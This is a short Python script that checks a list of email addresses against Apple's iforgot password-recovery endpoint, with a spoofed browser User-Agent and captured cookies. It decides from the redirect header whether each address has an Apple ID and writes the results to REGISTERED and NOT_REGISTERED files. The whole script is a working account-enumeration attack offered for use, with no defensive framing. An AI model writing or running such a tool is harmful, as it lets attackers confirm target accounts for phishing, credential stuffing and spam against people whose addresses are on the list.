import requests

s = requests.Session()

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}

# headers are dynamic, changes are required if it is not working

req = s.get("https://apple.com",headers=headers) # To capture cookies

# print(req.status_code)
# print(s.cookies)         

url = "https://iforgot.apple.com/password/verify/appleid"

openEmailFIle = open("listt.txt", "r").readlines() # change filename to your email list file
emails = []

for email in openEmailFIle :
    email = email.strip()
    emails.append(email)


for email in emails :

    login_data = {
        "id" : email
    }

    new_req = s.post(url,headers=headers,data=login_data)


    if new_req.headers['Location'] != "/404" :
        print(email, "-REGISTERED")
        with open("REGISTERED.txt", "a+") as live :
            live.write(email + "\n")

    else :
        print(email, "-NOT REGISTERED")
        with open("NOT_REGISTERED.txt", "a+") as dead :
            dead.write(email + "\n")
